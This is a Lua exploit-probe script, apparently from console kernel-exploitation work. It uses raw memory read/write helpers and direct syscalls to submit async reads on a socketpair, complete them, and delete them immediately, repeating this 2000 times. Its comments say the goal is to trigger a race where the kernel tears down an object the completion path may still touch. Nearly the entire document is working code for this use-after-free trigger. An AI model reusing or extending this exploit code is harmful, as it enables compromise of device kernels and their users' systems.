-- CRASH_CLASS: MODERATE
-- PROBE 880a: the delete's state gate is read at lookup time; the completion that flips
-- the state to 3 runs on the read's own thread.  So a delete issued immediately after the
-- byte lands can be refused (state still 2) and the very next call can succeed - that pair
-- is the gate-window crossing, and the teardown then runs on an object the completion
-- path may still be touching.  Single-threaded: no lock starvation.
print("=== PROBE 880a: delete immediately after completion ===")
local ROUNDS = 2000
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local page=0x4000
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local D=mmap(page); local ids=mmap(page); local st=mmap(page); local out=mmap(page)
local bufp=mmap(page); local res=mmap(page)
local fds=memory.alloc(8); local a,b=-1,-1
for try=1,5 do
    wd(fds,0xFFFFFFFF); wd(fds+4,0xFFFFFFFF)
    local ok,rv=pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(fds)) end)
    if ok and to_num(rv)==0 then a=rd(fds); b=rd(fds+4); break end
end
print(string.format("[A] socketpair %d/%d", a, b))
if a<0 then return end
local sc669,sc662,sc664,sc4=mk(669),mk(662),mk(664),mk(4)
local gate, ok1, s1s2, both, miss = 0,0,0,0,0
local samples={}
for r=1,ROUNDS do
    wq(D+0x00,uint64(0)); wq(D+0x08,uint64(0x1000)); wq(D+0x10,uint64(bufp)); wq(D+0x18,uint64(res)); wd(D+0x20,a); wd(D+0x24,0)
    wd(out,0); wq(bufp,uint64(0))
    local okc=pcall(function() return sc669(uint64(0x1001),uint64(D),uint64(1),uint64(1),uint64(out)) end)
    local id=rd(out) or 0
    if id==0 or not okc then break end
    pcall(function() sc4(uint64(b),uint64(bufp),uint64(1),uint64(0),uint64(0)) end) -- completes the read
    wd(ids,id); wd(st,0)
    pcall(function() sc662(uint64(ids),uint64(1),uint64(st)) end)
    local s1=rd(st) or 0
    if s1==0 then ok1=ok1+1
    else
        gate=gate+1
        wd(st,0)
        pcall(function() sc662(uint64(ids),uint64(1),uint64(st)) end)
        local s2=rd(st) or 0
        if s2==0 then both=both+1 else s1s2=s1s2+1 end
        if #samples<4 then samples[#samples+1]=string.format("%08X>%08X",s1,s2) end
    end
    if r%200==0 then print(string.format("[B] r=%d first-ok=%d gate=%d retry-ok=%d gate-both=%d", r, ok1, gate, both, s1s2)) end
end
print(string.format("[C] rounds=%d first-ok=%d gate=%d retry-ok=%d gate-then-gate=%d", ROUNDS, ok1, gate, both, s1s2))
for i=1,#samples do print("[D] sample " .. samples[i]) end
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
